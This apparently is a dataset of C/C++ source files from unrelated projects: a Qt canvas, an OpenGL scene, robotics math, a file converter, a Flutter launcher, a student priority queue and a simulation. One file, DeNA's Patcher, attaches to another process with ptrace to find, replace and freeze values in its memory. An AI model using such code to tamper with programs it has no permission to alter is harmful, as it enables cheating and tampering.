= event->pos().y() / cellSize;\n    emit gridClicked(QPoint(x, y));\n    QWidget::update();\n    startPoint = (QPoint(x, y));\n    trackMouse = true;\n}\n\nvoid Canvas::mouseReleaseEvent(QMouseEvent *event)\n{\n    if (trackMouse)\n    {\n        int x = event->pos().x() / cellSize;\n        int y = event->pos().y() / cellSize;\n        endPoint = (QPoint(x, y));\n        emit drawingAction(startPoint, endPoint);\n        trackMouse = false;  // Stop tracking the mouse\n    }\n    update();\n}\n\nvoid Canvas::updateCanvas(std::vector<QImage> newLayers)\n{\n    std::swap(layers, newLayers);\n}\n\nvoid Canvas::updateGridSizeTo16(){\n\n    setGridSize(16);\n    QWidget::update();\n}\n\nvoid Canvas::updateGridSizeTo32()\n{\n\n    setGridSize(32);\n    QWidget::update();\n}\n\nvoid Canvas::updateGridSizeTo64()\n{\n\n    setGridSize(64);\n    QWidget::update();\n}\n\nvoid Canvas::loadPressed()\n{\n    QFileDialog dialog(this);\n    dialog.setFileMode(QFileDialog::AnyFile);\n    dialog.setViewMode(QFileDialog::Detail);\n    QStringList fileNames;\n    if (dialog.exec())\n    {\n        fileNames = dialog.selectedFiles();\n    }\n\n    QWidget::update();\n}\n",
    "#include \"pch.h\"\n#include \"Scene.h\"\n#include \"ShaderLibrary.h\"\n#include \"Event.h\"\n#include \"Application.h\"\n#include \"ModelLibrary.h\"\n\n#include \"AssetLibrary.h\"\n\nconst unsigned int SCR_WIDTH = 1280;\nconst unsigned int SCR_HEIGHT = 720;\n\nShared<Shader> modelShader_;\n\nShared<Model> sponza_;\nShared<Model> backPack_;\nShared<Model> helmet_;\nShared<Model> test_;\nShared<Model> breakfast_;\n\nint modelIndex_;\n\nShared<Model> activeModel_;\n\nCamera camera({ 0, 3.5, 0 });\n\nbool pressedReload = false;\nbool f2Pressed = false;\nbool pressed = false;\nglm::vec3 backgroundColor = { 0, 0, 0 };\n\nglm::vec4 lightVector = { 0, 0, 0, 1.000 };\nglm::vec3 lightDiffuseColor = { 1, 1, 1 };\nglm::vec3 lightAmbientColor = { 1, 1, 1 };\nglm::vec3 lightSpecularColor = { 1, 1, 1 };\n\nScene::Scene()\n{\n    modelShader_ = ShaderLibrary::LoadShader(\"default\", \"assets/shaders/default.vert\", \"assets/shaders/default.frag\");\n\n    sponza_ = ModelLibrary::LoadModel(\"sponza\", \"assets/models/sponza/sponza.obj\");\n    sponza_->scale_ = glm::vec3(0.00625f, 0.00625f, 0.00625f);\n\n    backPack_ = ModelLibrary::LoadModel(\"backpack\", \"assets/models/backpack/backpack.obj\");\n    backPack_->scale_ = glm::vec3(0.00625f, 0.00625f, 0.00625f);\n\n    test_ = ModelLibrary::LoadModel(\"material_test\", \"assets/models/material_test/material_test.obj\");\n\n    helmet_ = ModelLibrary::LoadModel(\"helmet\", \"assets/models/damaged_helmet/DamagedHelmet.gltf\");\n\n    breakfast_ = ModelLibrary::LoadModel(\"breakfast\", \"assets/models/breakfast_room/breakfast_room.obj\");\n\n    activeModel_ = sponza_;\n\n    //Shared<Material> m = AssetLibrary::LoadMaterial(\"pathTest\");\n    //Shared<Texture> t = AssetLibrary::LoadTexture(\"pathTest\");\n    //Shared<Shader> s = AssetLibrary::LoadShader(\"pathTest\");\n\n    //Shared<Material> a = AssetLibrary::GetAsset<Material>(m->assetHandle_);\n    //Shared<Texture> b = AssetLibrary::GetAsset<Texture>(t->assetHandle_);\n    //Shared<Shader> c = AssetLibrary::GetAsset<Shader>(s->assetHandle_);\n\n    std::cout << '\\n';\n}\n\nScene::~Scene()\n{\n}\n\nvoid Scene::OnEvent(Event& event)\n{\n}\n\nvoid Scene::OnImGuiRender(double time, double dt)\n{\n    ImGui::Begin(\"Lights\");\n    ImGui::DragFloat4(\"##Lights Position\", &lightVector[0], 0.5f, 0, 0, \"%.3f\");\n    ImGui::ColorEdit3(\"##Lights Diffuse Color\", &lightDiffuseColor[0]);\n    ImGui::ColorEdit3(\"##Lights Ambient Color\", &lightAmbientColor[0]);\n    ImGui::ColorEdit3(\"##Lights Specular Color\", &lightSpecularColor[0]);\n    ImGui::End();\n\n    ImGui::Begin(\"Materials\");\n\n    std::unordered_set<unsigned int> keys;\n    std::vector<Shared<Material>> materials;\n\n    for (const Shared<Mesh>& mesh : activeModel_->meshes) {\n        Shared<Material> material = mesh->material_;\n        if (keys.find(material->materialId) != keys.end()) {\n            continue;\n        }\n        keys.insert(material->materialId);\n        materials.push_back(material);\n    }\n\n    std::vector<std::string> materialNames;\n\n    // Populate material names\n    for (const auto& material : materials) {\n        materialNames.push_back(material->name);\n    }\n\n    // Variable to store the selected material index\n    static int selectedMaterialIndex = -1;\n\n    ImGui::Spacing();\n    ImGui::Text(\"Material:\");\n\n    // Dropdown menu to select material\n    ImGui::SetNextItemWidth(128);\n    if (ImGui::BeginCombo(\"##MaterialCombo\", selectedMaterialIndex == -1 ? \"Select Material\" : materialNames[selectedMaterialIndex].c_str())) {\n        for (int i = 0; i < materialNames.size(); ++i) {\n            bool isSelected = (selectedMaterialIndex == i);\n            if (ImGui::Selectable(materialNames[i].c_str(), isSelected)) {\n                selectedMaterialIndex = i;\n            }\n            if (isSelected) {\n                ImGui::SetItemDefaultFocus();\n            }\n        }\n        ImGui::EndCombo();\n    }\n\n    ImGui::SameLine();\n    if (ImGui::Button(\"Reload Shaders\")) {\n        ShaderLibrary::Reload();\n    }\n\n    if (selectedMaterialIndex != -1 && selectedMaterialIndex < materials.size()) {\n        Shared<Material> selectedMaterial = materials[selectedMaterialIndex];\n\n        unsigned int textureID;\n\n        if (selectedMaterial->diffuseTexture != nullptr) {\n            textureID = selectedMaterial->diffuseTexture->id();\n            ImGui::Spacing();\n            ImGui::Text(\"Diffuse:\");\n            ImGui::Image((ImTextureID)textureID, ImVec2(256, 256));\n        }\n        ImGui::SliderFloat3(\"##Diffuse Albedo\", &selectedMaterial->diffuseColor[0], 0, 1);\n\n        if (selectedMaterial->ambientTexture != nullptr) {\n            textureID = selectedMaterial->ambientTexture->id();\n            ImGui::Spacing();\n            ImGui::Text(\"Ambient:\");\n            ImGui::Image((ImTextureID)textureID, ImVec2(256, 256));\n        }\n        ImGui::SliderFloat3(\"##Ambient Ambient\", &selectedMaterial->ambientColor[0], 0, 1);\n\n        if (selectedMaterial->specularTexture != nullptr) {\n            textureID = selectedMaterial->specularTexture->id();\n            ImGui::Spacing();\n            ImGui::Text(\"Specula",
    "/*\n * Copyright (C) 2024 IIT-HHCM\n * Author: Liana Bertoni\n * email:  liana.bertoni@iit.it\n * \n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n * http://www.apache.org/licenses/LICENSE-2.0\n * \n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n*/\n\n#include <DynamicCollisionAvoidance/utils/algebra.h>\n\nAlgebra::Algebra()\n{\n\n}\n\nEigen::MatrixXd Algebra::pseudoInverse(Eigen::MatrixXd M_)\n{\n    // psuedo-inverse of a not-square matrix (SVD based)\n    Eigen::BDCSVD<Eigen::MatrixXd> svd(M_, Eigen::ComputeThinU | Eigen::ComputeThinV);\n    double epsilon = std::numeric_limits<double>::epsilon();\n    svd.setThreshold(epsilon*std::max(M_.cols(), M_.rows()));\n    Eigen::Index rank = svd.rank();\n    Eigen::MatrixXd tmp = svd.matrixU().leftCols(rank).adjoint();\n    tmp = svd.singularValues().head(rank).asDiagonal().inverse() * tmp;\n    return svd.matrixV().leftCols(rank) * tmp;\n}\n\nvoid Algebra::getSkewMatrix(Eigen::VectorXd p, Eigen::MatrixXd& Skew)\n{\n    Skew = Eigen::MatrixXd::Zero(3,3);\n    Skew(0,1) = -p(2);\n    Skew(0,2) =  p(1);\n    Skew(1,0) =  p(2);\n    Skew(1,2) = -p(0);\n    Skew(2,0) = -p(1);\n    Skew(2,1) =  p(0);\n}\n\nEigen::VectorXd Algebra::quatToEulerDeg(Eigen::VectorXd quat) // quat : x y z w \n{\n    return radTodeg(quatToEulerRad(quat));\n}\n\nEigen::VectorXd Algebra::quatToEulerRad(Eigen::VectorXd quat)\n{\n    Eigen::Vector3d eulerAnglesDeg;\n    Eigen::Quaterniond q;\n    q.x() = quat(0);\n    q.y() = quat(1);\n    q.z() = quat(2);\n    q.w() = quat(3);\n    q.normalize();\n\n    Eigen::Matrix3d rot;\n    rot = q.toRotationMatrix();\n    eulerAnglesDeg = rot.eulerAngles(0,1,2); // roll-x pitch-y yaw-z\n\n    Eigen::VectorXd vecReturn(3);\n    vecReturn(0) = eulerAnglesDeg(0);\n    vecReturn(1) = eulerAnglesDeg(1);\n    vecReturn(2) = eulerAnglesDeg(2);\n\n    return vecReturn;\n}\n\nEigen::VectorXd Algebra::quatToEuler(Eigen::VectorXd quat, bool areDegrees)\n{\n    if(areDegrees)\n        return quatToEulerDeg(quat);\n    else\n        return quatToEulerRad(quat);\n}\n\nEigen::VectorXd Algebra::eulersToQuatsRad(Eigen::VectorXd eulerAngleOrients)\n{\n    int dim = (eulerAngleOrients.size()/3)*4;\n    Eigen::VectorXd quatOrients(dim);\n    int j = 0;\n    for (int i = 0; i < dim/4; i+=4)\n    {\n        quatOrients.segment<4>(i) = EulerToQuatVec(eulerAngleOrients.segment<3>(j));\n        j += 3;\n    }\n\n    return quatOrients;\n}\n\nEigen::VectorXd Algebra::eulersToQuatsDeg(Eigen::VectorXd eulerAngleOrients)\n{\n    return radTodeg(eulersToQuatsRad(eulerAngleOrients));\n}\n\nEigen::VectorXd Algebra::eulersToQuats(Eigen::VectorXd eulerAngleOrients, bool areDegrees)\n{\n    if(areDegrees)\n        return eulersToQuatsDeg(eulerAngleOrients);\n    else\n        return eulersToQuatsRad(eulerAngleOrients);\n}\n\nEigen::VectorXd Algebra::EulerToQuatVec(Eigen::VectorXd eulerAngles)\n{\n    Eigen::VectorXd quatVec(4);\n    Eigen::Quaternionf q;\n    q = EulerToQuat(eulerAngles);\n\n    quatVec(0) = q.x();\n    quatVec(1) = q.y();\n    quatVec(2) = q.z();\n    quatVec(3) = q.w();\n\n    return quatVec;\n}\n\nEigen::Quaternionf Algebra::EulerToQuat(Eigen::VectorXd eulerAngles)\n{\n    // psuedo-inverse of a not-square matrix (SVD based)\n    degTorad(eulerAngles,eulerAngles);\n    Eigen::Quaternionf q;\n    q = Eigen::AngleAxisf(eulerAngles[2], Eigen::Vector3f::UnitZ())\n      * Eigen::AngleAxisf(eulerAngles[1], Eigen::Vector3f::UnitY())\n      * Eigen::AngleAxisf(eulerAngles[0], Eigen::Vector3f::UnitX());\n    return q;\n}\n\nEigen::VectorXd Algebra::RotToQuat(Eigen::Matrix3d rot)\n{\n    Eigen::VectorXd q_vec(4); // x y z w \n    Eigen::Quaterniond q(rot);\n\n    q_vec(0) = q.x();\n    q_vec(1) = q.y();\n    q_vec(2) = q.z();\n    q_vec(3) = q.w();\n\n    return q_vec;\n}\n\nvoid Algebra::getTransformationRotTrasl(Eigen::Affine3d T, Eigen::Matrix3d& rot, Eigen::VectorXd& trasl)\n{\n    trasl = T.translation();\n    rot = T.rotation();\n}\n\nvoid Algebra::minToT(Eigen::VectorXd position, Eigen::VectorXd orientation, Eigen::Affine3d& T, bool areDegree)\n{\n    // set translation\n    T = Eigen::Affine3d::Identity();\n    T.translation()[0] = position[0];\n    T.translation()[1] = position[1];\n    T.translation()[2] = position[2];\n    // set orientation\n    // set quat\n    Eigen::Quaterniond q;\n    if(orientation.size() == 3)\n    {\n        if(areDegree)\n            degTorad(orientation,orientation);\n\n        q = Eigen::AngleAxisd(orientation[2], Eigen::Vector3d::UnitZ())\n          * Eigen::AngleAxisd(orientation[1], Eigen::Vector3d::UnitY())\n          * Eigen::AngleAxisd(orientation[0], Eigen::Vector3d::UnitX());\n    }\n    else\n    {\n        q.x() = orientation[0];\n        q.y() = orientation[1];\n        q.z() = orientation[2];\n   ",
    "#include \"cevir.h\"\n#include \"backends/backend.hpp\"\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nconst char *which_error = \"which: no %s\", *which_cmd = \"which %s\";\n\nenum Result test_cli(const char* app)\n{\n    enum Result res = EXECUTABLE_NOT_FOUND;\n    char cmd[SMOL_BUFF] = {};\n    sprintf(cmd, which_cmd, app);\n\n    FILE *which_pipe = popen(cmd, \"r\");\n    if (!which_pipe)\n        return UNKNOWN_ERROR;\n\n    char buff[SMOL_BUFF] = {};\n    char unwanted_output[SMOL_BUFF] = {};\n    sprintf(unwanted_output, which_error, app);\n\n    if (fgets(buff, sizeof(buff), which_pipe) == NULL)\n        goto out;\n\n    if (buff[0] == '/')\n        res = SUCCESS;\n    else if (strncmp(buff, unwanted_output, strlen(unwanted_output)) != 0)\n        res = UNKNOWN_ERROR;\nout:\n    pclose(which_pipe);\n    return res;\n}\n\nenum Result check_available(enum ConverterProgram *inout) {\n    for (const auto& [k, v] : EXECUTABLE_NAMES) {\n        if ((k & *inout) == 0) continue;\n        if (test_cli(v) == SUCCESS) {\n            *inout = k;\n            return SUCCESS;\n        }\n    }\n    return EXECUTABLE_NOT_FOUND;\n}\n\nenum Result convert_helper(const char *file, const char *extension, const char *output_folder, enum ConverterProgram cp, GtkWidget* settingsw)\n{\n    enum Result r = EXECUTABLE_NOT_FOUND;\n    enum ConverterProgram use_this = cp;\n    check_available(&use_this);\n    std::string output_path;\n\n    size_t dot_pos = 0;\n    for (size_t i = 0; i < strlen(file); i++)\n        if (file[i] == '.')\n            dot_pos = i;\n    if (output_folder == NULL) {\n        output_path.assign(file, 0, dot_pos+1);\n        output_path.append(extension);\n    } else {\n        size_t slash_pos = 0;\n        for (size_t i = 0; i < strlen(file); i++)\n            if (file[i] == '/')\n                slash_pos = i;\n        output_path.assign(output_folder);\n        output_path.append(file+slash_pos, dot_pos-slash_pos);\n        output_path += \".\";\n        output_path.append(extension);\n    }\n\n    if (use_this == IMAGEMAGICK)\n        r = imagemagick_convert_single(file, output_path.c_str(), imagemagick_get_settings(settingsw));\n    else if (use_this == FFMPEG)\n        r = ffmpeg_convert_single(file, output_path.c_str(), ffmpeg_get_settings(settingsw));\n    else if (use_this == PANDOC)\n        r = pandoc_convert_single(file, output_path.c_str(), pandoc_get_settings(settingsw)); // For testing\n    else if (use_this == LIBREOFFICE)\n        r = libreoffice_convert_single(file, output_folder, extension, (struct LibreofficeSettings) {});\n\n    return r;\n}\n\nint get_converter_from_extension(const char *extension)\n{\n    int res = UNSUPPORTED;\n    for (const auto& [key, val] : FORMAT_EXTENSIONS) {\n        if (strcmp(val.c_str(), extension) != 0) continue;\n        printf(\"'%s' == '%s'\\n\", val.c_str(), extension);\n        if (LIBREOFFICE_CONVERSIONS.contains(key))\n            res |= LIBREOFFICE;\n        if (PANDOC_CONVERSIONS.contains(key))\n            res |= PANDOC;\n        if (FFMPEG_CONVERSIONS.contains(key))\n            res |= FFMPEG;\n        if (IMAGEMAGICK_CONVERSIONS.contains(key))\n            res |= IMAGEMAGICK;\n    }\n\n    return res;\n}\n\nchar *get_extension(const char* file)\n{\n    size_t dot_pos = 0;\n    for (size_t i = 0; i < strlen(file); i++)\n        if (file[i] == '.')\n            dot_pos = i;\n    char *extension = (char*) malloc((strlen(file)-dot_pos)*sizeof(char));\n    strcpy(extension, file+dot_pos+1);\n    return extension;\n}\n\nvoid create_dropdown_list(std::vector<enum FileFormat> formats, char** out) {\n    size_t ind = 0;\n    for (auto f : formats)\n        out[ind++] = (char*) FORMAT_EXTENSIONS.find(f)->second.c_str();\n}\n",
    "/*\n * Copyright 2024 DeNA Co., Ltd.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND,\n * either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n#include <algorithm>\n#include <assert.h>\n#include <map>\n#include <memory>\n#include <sstream>\n#include <string.h>\n#include <time.h>\n#include <vector>\n\n#include \"Converter.h\"\n#include \"Patcher.h\"\n#include \"Snapshot.h\"\n#include \"Utility.h\"\n\nstd::string Patcher::GetModeString(Mode mode) {\n  std::map<Mode, std::string> temp = {\n      {Mode::NOP, \"nop\"},\n      {Mode::LOOKUP, \"lookup\"},\n      {Mode::FILTER, \"filter\"},\n      {Mode::CHANGE, \"change\"},\n  };\n  assert(temp.count(mode));\n  return temp[mode];\n}\nPatcher::Mode Patcher::GetMode(const std::string &str) {\n  std::map<std::string, Mode> temp = {\n      {\"nop\", Mode::NOP},  {\"lookup\", Mode::LOOKUP}, {\"filter\", Mode::FILTER}, {\"change\", Mode::CHANGE},\n      {\"l\", Mode::LOOKUP}, {\"f\", Mode::FILTER},      {\"c\", Mode::CHANGE},\n  };\n  assert(temp.count(str));\n  return temp[str];\n}\n\n//================================================================================\n// Command\n//================================================================================\n\nbool Patcher::Attach(const std::string &command, std::stringstream &sin) { return ptrace_->Attach(); }\n\nbool Patcher::Detach(const std::string &command, std::stringstream &sin) { return ptrace_->Detach(); }\n\nbool Patcher::Clear(const std::string &command, std::stringstream &sin) {\n  addr_set_.clear();\n  return true;\n}\n\nbool Patcher::Process(const std::string &command, std::stringstream &sin) {\n  std::string type, str;\n  if (!(sin >> type >> str)) {\n    return false;\n  }\n  ChangeString change_str;\n  if (!change_str.Init(type, str)) {\n    Utility::DebugLog(\"%s is wrong type\", type.c_str());\n    return false;\n  }\n  if (!Process(GetMode(command), change_str)) {\n    return false;\n  }\n  Utility::DebugLog(\"Please Input Command\");\n  return true;\n}\n\nbool Patcher::PairFilter(const std::string &command, std::stringstream &sin) {\n  std::string type, str;\n  int store_size;\n  if (!(sin >> type >> str >> store_size)) {\n    return false;\n  }\n\n  std::vector<TargetAddress> prev_addr_set = addr_set_;\n  ChangeString change_str;\n  if (!change_str.Init(type, str)) {\n    Utility::DebugLog(\"%s is wrong type\", type.c_str());\n    return false;\n  }\n  if (!Process(Mode::LOOKUP, change_str)) {\n    return false;\n  }\n\n  std::vector<std::pair<size_t, TargetAddress>> addr_dists;\n  sort(prev_addr_set.begin(), prev_addr_set.end());\n  sort(addr_set_.begin(), addr_set_.end());\n  {\n    // \u5c3a\u53d6\u308a\u30e1\u30bd\u30c3\u30c9\u3067\u30a2\u30c9\u30ec\u30b9\u9593\u306e\u4e00\u756a\u8fd1\u3044\u8ddd\u96e2\u3092\u6c42\u3081\u308b\n    auto it2 = addr_set_.begin();\n    for (auto it1 = prev_addr_set.begin(); it1 != prev_addr_set.end(); it1++) {\n      size_t dist = 1e+9;\n      while (true) {\n        auto nit2 = it2 + 1;\n        if (nit2 == addr_set_.end()) {\n          break;\n        }\n        size_t ndist = it1->GetAddress().Dist(nit2->GetAddress());\n        if (ndist >= dist) {\n          break;\n        }\n        dist = ndist;\n        it2 = nit2;\n      }\n      addr_dists.emplace_back(dist, *it1);\n    }\n  }\n  std::sort(addr_dists.begin(), addr_dists.end());\n\n  addr_set_.clear();\n  const int MAX_OUTPUT_SIZE = store_size + 10;\n  int output_cnt = 0;\n  for (auto it = addr_dists.begin(); it != addr_dists.end() && output_cnt < MAX_OUTPUT_SIZE; it++, output_cnt++) {\n    size_t dist = it->first;\n    const TargetAddress &addr = it->second;\n    if ((int)addr_set_.size() < store_size) {\n      addr_set_.emplace_back(addr);\n    }\n    Utility::DebugLog(\"Dist: %zd, Address: %zx\", dist, addr.GetAddress().to_i());\n  }\n  Utility::DebugLog(\"Result Address: %d\", (int)addr_set_.size());\n\n  Utility::DebugLog(\"\");\n  Utility::DebugLog(\"Please Input Command\");\n  return true;\n}\n\nbool Patcher::Replace(const std::string &command, std::stringstream &sin) {\n  std::string hex_start, string_type, after;\n  size_t start;\n  if (!(sin >> hex_start >> string_type >> after) || sscanf(hex_start.c_str(), \"%zx\", &start) != 1) {\n    return false;\n  }\n  // TODO\n  ChangeString change_str;\n  if (!change_str.Init(string_type, after)) {\n    Utility::DebugLog(\"%s %s is not same length or wrong type\", string_type.c_str(), after.c_str());\n    return false;\n  }\n\n  if (!ptrace_->Attach() || !CreateRangeSet()) {\n    return false;\n  }\n  TargetAddress address(Range::Fit(range_set_, Address(start)), change_str);\n  if (address.GetAddress().to_i() == 0) {\n    Utility::DebugLog(\"Target Address is over the memory range\");\n    return false;\n  }\n  Replace(address, change_str);\n  return true;\n}\n\nbool Patcher::Freeze(const std::string &command, std",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"i_am_rich\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "//======== Copyright (c) 2021, FIT VUT Brno, All rights reserved. ============//\n//\n// Purpose:     Test Driven Development - priority queue code\n//\n// $NoKeywords: $ivs_project_1 $tdd_code.cpp\n// $Author:     SIMONA CESKOVA <xcesko00@stud.fit.vutbr.cz>\n// $Date:       $2021-03-12\n//============================================================================//\n/**\n * @file tdd_code.cpp\n * @author SIMONA CESKOVA\n * \n * @brief Implementace metod tridy prioritni fronty.\n */\n\n#include <stdlib.h>\n#include <stdio.h>\n\n#include \"tdd_code.h\"\n\n//============================================================================//\n// ** ZDE DOPLNTE IMPLEMENTACI **\n//\n// Zde doplnte implementaci verejneho rozhrani prioritni fronty (Priority Queue)\n// 1. Verejne rozhrani fronty specifikovane v: tdd_code.h (sekce \"public:\")\n//    - Konstruktor (PriorityQueue()), Destruktor (~PriorityQueue())\n//    - Metody Insert/Remove/Find a GetHead\n//    - Pripadne vase metody definovane v tdd_code.h (sekce \"protected:\")\n//\n// Cilem je dosahnout plne funkcni implementace prioritni fronty implementovane\n// pomoci tzv. \"double-linked list\", ktera bude splnovat dodane testy\n// (tdd_tests.cpp).\n//============================================================================//\n\n// m_pHead >= p_1 >= p_2 >= ... >= p_tail\n\nPriorityQueue::PriorityQueue() : m_pHead(NULL) {}\n\nPriorityQueue::~PriorityQueue()\n{\n    //projdu cely seznam a pokazde smazu jeden node\n    //mazu od prvniho nodu\n    Element_t *free_node = NULL;\n    for (Element_t *temp_node = m_pHead; temp_node != NULL;)\n    {\n        free_node = temp_node;\n        temp_node = temp_node->pNext;\n        //vymazu node z pameti\n        delete free_node;\n    }\n}\n\nvoid PriorityQueue::Insert(int value)\n{\n    //vytvorim si novy node ktery budu vkladat\n    Element_t *new_node = new Element_t{\n        .pNext = NULL,\n        .value = value\n    };\n    //pokud je seznam jeste prazdny tak do m_pHead vlozim prvni prvek s hodnotou value\n    if (m_pHead == NULL)\n        m_pHead = new_node;\n    else\n    {\n        //kontroluji velikost hodnoty a podle toho ji zaradim do podminky kam patri\n        if (value >= m_pHead->value)\n        {\n            //pomoci temp_node_head vlozim novy node do seznamu\n            auto temp_node_head = m_pHead;\n            new_node->pNext = temp_node_head;\n            m_pHead = new_node;\n        }\n        else if (value < m_pHead->value)\n        {\n            //v cyklu prochazim po ukazatelych prvky a porovnavam jejich hodnotu s value s novou\n            Element_t *fr_node = m_pHead;\n            Element_t *temp_node = m_pHead;\n            for (; temp_node != NULL; temp_node = temp_node->pNext)\n            {\n                if (value >= temp_node->value)\n                {\n                    new_node->pNext = temp_node;\n                    fr_node->pNext = new_node;\n                    return;\n                }\n                fr_node = temp_node;\n            }\n            new_node->pNext = temp_node;\n            fr_node->pNext = new_node;\n        }\n    }\n}\n\nbool PriorityQueue::Remove(int value)\n{\n    //kdyz je seznam prazdny tak nemam co mazat\n    if (m_pHead == NULL)\n        return false;\n    //kdyz mam smazat head, tak pomoci promenne ktera ukazuje na cestu od head k next node\n    //do nove head dam dalsi node\n    if (value == m_pHead->value)\n    {\n        auto temp_node_head = m_pHead;\n        m_pHead = temp_node_head->pNext;\n        delete temp_node_head;\n        return true;\n    }\n    //projdu cyklem vsechny node a hledam hodnotu na smazani\n    Element_t *fr_node = m_pHead;\n    Element_t* temp_node = m_pHead;\n    while(temp_node != NULL)\n    {\n        if (value == temp_node->value)\n        {\n            auto to_del = temp_node;\n            fr_node->pNext = to_del->pNext;\n            delete to_del;\n            return true;\n        }\n        fr_node = temp_node;\n        temp_node = temp_node->pNext;\n    }\n    return false;\n}\n\nPriorityQueue::Element_t *PriorityQueue::Find(int value)\n{\n    //pomoci cyklu hledam hledanou hodnotu, vratim na ni ukazatel\n    //jinak vratim ukazatel na NULL\n    Element_t* temp_node = m_pHead;\n    while(temp_node != NULL)\n    {\n        if (value == temp_node->value)\n        {\n            return temp_node;\n        }\n        temp_node = temp_node->pNext;\n    }\n    return NULL;\n}\n\nsize_t PriorityQueue::Length()\n{\n    //spocitam delku seznamu tak ze spocitam vsechny node v seznamu\n    size_t sum = 0;\n    Element_t* temp_node = m_pHead;\n    while (temp_node != NULL)\n    {\n        sum++;\n        temp_node = temp_node->pNext;\n    }\n    return sum;\n}\n\nPriorityQueue::Element_t *PriorityQueue::GetHead()\n{\n    return m_pHead;\n}\n\n/*** Konec souboru tdd_code.cpp ***/",
    "#include \"Organism.h\"\r\n#include \"Animal.h\"\r\n#include \"World.h\"\r\nusing namespace std;\r\n\r\n#define UP 1\r\n#define DOWN 2\r\n#define RIGHT 3\r\n#define LEFT 4\r\n\r\n#define SAMESPECIE 0\r\n#define ANIMAL 1\r\n#define PLANT 2\r\n#define FREESPACE 3\r\n\r\n\r\nOrganism::Organism(int strenght, int initiative,char symb, int x, int y,World* world, char type, InfoTeller* info)\r\n\t: strenght(strenght), initiative(initiative), symbol(symb), world(*world), positionX(x), positionY(y), type(type), info(*info)\r\n{}\r\n\r\nchar Organism::GetSymbol(){\r\n\treturn symbol;\r\n}\r\n\r\nint Organism::GetPositionX(){\r\n\treturn positionX;\r\n}\r\n\r\nint Organism::GetPositionY(){\r\n\treturn positionY;\r\n}\r\n\r\nint Organism::GetAge(){\r\n\treturn age;\r\n}\r\n\r\nint Organism::GetInitiative() {\r\n\treturn initiative;\r\n}\r\n\r\nbool Organism::GetMove()\r\n{\r\n\tif (moved == true)\r\n\t\treturn true;\r\n\telse\r\n\t\treturn false;\r\n}\r\n\r\nchar Organism::GetType() {\r\n\treturn type;\r\n}\r\n\r\nint Organism::GetStrenght() {\r\n\treturn strenght;\r\n}\r\n\r\nvoid Organism::IncreaseAge()\r\n{\r\n\tage++;\r\n}\r\n\r\nvoid Organism::SetToDead() {\r\n\talive = false;\r\n}\r\n\r\nvoid Organism::SetAge(int age)\r\n{\r\n\tage = age;\r\n}\r\n\r\nvoid Organism::SetStrenght(int s)\r\n{\r\n\tstrenght = s;\r\n}\r\n\r\nvoid Organism::ChangeMoved(bool move)\r\n{\r\n\tif (move == true)\r\n\t\tmoved = false;\r\n\telse\r\n\t\tmoved = true;\r\n}\r\n\r\nbool Organism::CheckIfAlive()\r\n{\r\n\tif (alive == true)\r\n\t\treturn true;\r\n\telse\r\n\t\treturn false;\r\n}\r\n\r\nvoid Organism::findFreeCellAndSetPos(int posX, int posY, World& world, Organism& creature)\r\n{\r\n\r\n\tfor (int i = -1; i < 2; i++)\r\n\t{\r\n\t\tfor (int j = -1; j < 2; j++)\r\n\t\t{\r\n\t\t\tif (i == 0 && j == 0)\r\n\t\t\t\tcontinue;\r\n\t\t\tif (world.CheckIfout(posX+i,posY+j)==false&& world.IsOccupied(posX + i, posY + 1) == ' '){\r\n\t\t\t\tcreature.SetPosition(posX + i, posY + j);\r\n\t\t\t\treturn;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid Organism::fight(int posX, int posY, World& world,InfoTeller& info){\r\n\t\r\n\t//opponent data\r\n\tOrganism* deffender1 = world.FindOrganism(posX, posY);\r\n\tint opponentStrenght = deffender1->GetStrenght();\r\n\tchar def_symbol = deffender1->GetSymbol();\r\n\r\n\t//my data\r\n\tint strenght = GetStrenght();\r\n\tint myX = GetPositionX(), myY = GetPositionY();\r\n\tchar symbol = GetSymbol();\r\n\r\n\tif (def_symbol == 'T' && strenght < 5)\r\n\t\treturn;\r\n\telse if (def_symbol == 'A') {\r\n\t\tdouble randomValue = static_cast<double>(rand()) / (RAND_MAX + 1.0);\r\n\t\tif (randomValue > 0.5){\r\n\t\t\tinfo.AddToMessages('A', ' ', 'E');\r\n\t\t\tfindFreeCellAndSetPos(posX, posY, world, *deffender1);\r\n\t\t\treturn;\r\n\t\t}\r\n\t}\r\n\tif (def_symbol == 'u'){\t\t//for guarana\r\n\t\tAnimal* animalPtr = 